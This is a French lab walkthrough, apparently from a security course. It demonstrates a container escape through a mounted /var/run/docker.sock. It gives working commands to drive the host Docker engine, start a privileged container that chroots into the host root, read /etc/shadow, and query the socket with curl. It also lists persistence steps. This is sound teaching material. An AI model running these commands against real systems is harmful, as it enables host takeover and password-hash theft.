# Scénario d'attaque — Container Escape via `/var/run/docker.sock`

> Document pédagogique. Toutes les manipulations doivent être réalisées dans
> votre laboratoire local (WSL2 + Docker Desktop ou VM Linux dédiée).

---

## 0. Pré-requis

- Docker Desktop installé sur Windows 11.
- WSL2 Ubuntu disponible.
- Le service `internal-document-portal` lancé via la configuration **vulnérable** :

  ```bash
  docker compose up --build
  ```

  Une fois démarré, la stack ressemble à :

  ```
  Hôte (Linux / WSL2)
   └─ Docker Engine
       └─ Conteneur idp-app
           └─ Node.js / Express  (Internal Document Portal)
               └─ /var/run/docker.sock  ← MONTÉ DEPUIS L'HÔTE
  ```

---

## Phase 1 — Application légitime

L'utilisateur accède à [http://localhost:3000](http://localhost:3000), s'authentifie avec
`employee@company.local / password123`, consulte des documents internes et
upload un fichier. **Tout fonctionne normalement.**

---

## Phase 2 — Compromission du conteneur

On suppose que l'attaquant a obtenu un shell dans le conteneur applicatif.
Cela peut arriver via :

- une RCE applicative (injection de commande, déserialisation, etc.) ;
- une fuite de credentials donnant accès à un endpoint de debug ;
- une compromission d'un service voisin sur le même réseau Docker.

Dans le cadre du TP, on simule cette étape avec :

```bash
docker exec -it idp-app bash
```

À partir de cet instant, l'attaquant a le rôle d'un **processus exécuté à
l'intérieur du conteneur applicatif**.

---

## Phase 3 — Découverte

Depuis le shell du conteneur :

```bash
id
# uid=0(root) gid=0(root) groups=0(root)         ← PROBLÈME 1 : root dans le conteneur

ls -l /var/run/docker.sock
# srw-rw---- 1 root root 0 ... /var/run/docker.sock   ← PROBLÈME 2 : socket Docker monté

which docker && docker --version
# Le client Docker est présent (installé dans le Dockerfile)
```

L'attaquant constate :

1. Il tourne en **root** dans le conteneur.
2. Le socket Docker (`/var/run/docker.sock`) est accessible.
3. Le client `docker` est installé localement.

→ Il peut maintenant **piloter le Docker Engine de l'hôte** comme s'il était
administrateur de la machine.

---

## Phase 4 — Exploitation : prendre le contrôle de Docker Engine

```bash
docker -H unix:///var/run/docker.sock version
docker -H unix:///var/run/docker.sock ps -a
docker -H unix:///var/run/docker.sock images
```

Tout fonctionne : depuis le conteneur, on dialogue directement avec le Docker
de l'hôte.

---

## Phase 5 — Container Escape : shell root sur l'hôte

L'attaquant lance un nouveau conteneur **privilégié** qui monte la racine de
l'hôte (`/`) à l'intérieur de lui-même :

```bash
docker -H unix:///var/run/docker.sock run --rm -it \
    --privileged \
    --pid=host \
    -v /:/host \
    alpine chroot /host sh
```

À l'intérieur de ce nouveau conteneur :

```sh
hostname        # ← nom de l'hôte, plus celui du conteneur
cat /etc/shadow # ← lecture des hashes des mots de passe de l'hôte
ls /root        # ← répertoire root de l'hôte
```

→ **Container Escape réussi.** L'attaquant possède un shell **root** sur la
machine hôte alors qu'il était au départ confiné dans un conteneur applicatif.

---

## Phase 6 — Post-exploitation possible

Une fois sur l'hôte, l'attaquant peut :

- déposer un binaire SUID dans `/usr/local/bin` ;
- ajouter une clé SSH dans `/root/.ssh/authorized_keys` ;
- créer un utilisateur persistant ;
- pivoter vers d'autres conteneurs via le Docker Engine ;
- exfiltrer les volumes, secrets, base de données, etc.

---

## Variantes de l'attaque

### Variante A — Sans `--privileged`

Le simple montage de `/var/run/docker.sock` suffit : le conteneur n'a pas
besoin d'être privilégié au départ. C'est *le conteneur que l'on lance après*
qui est privilégié.

### Variante B — Sans client Docker installé

L'API Docker est une simple API HTTP sur socket UNIX. On peut l'attaquer
directement avec `curl` :

```bash
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

→ Même un conteneur très minimaliste peut exploiter la vulnérabilité.

---

## Captures à réaliser pour le rapport

1. Lancement de `docker compose up` (configuration vulnérable).
2. Page de login + dashboard de l'application.
3. `docker exec -it idp-app bash` — entrée dans le conteneur.
4. `id` montrant `uid=0(root)`.
5. `ls -l /var/run/docker.sock` montrant le socket monté.
6. `docker ps` exécuté **depuis le conteneur**.
7. `chroot /host sh` + `cat /etc/shadow` — preuve du Container Escape.
8. Comparaison avec `docker compose -f docker-compose.secure.yml up` :
   l'attaque échoue parce que le socket n'est plus monté et que l'utilisateur
   n'est plus root.

---

## Conclusion

Le montage de `/var/run/docker.sock` revient à **donner les droits root sur
l'hôte** à toute personne capable d'exécuter du code dans le conteneur.
C'est une mauvaise pratique extrêmement répandue dans les environnements CI/CD
et les outils internes de DevOps. La contre-mesure se trouve dans
[`HARDENING.md`](HARDENING.md).
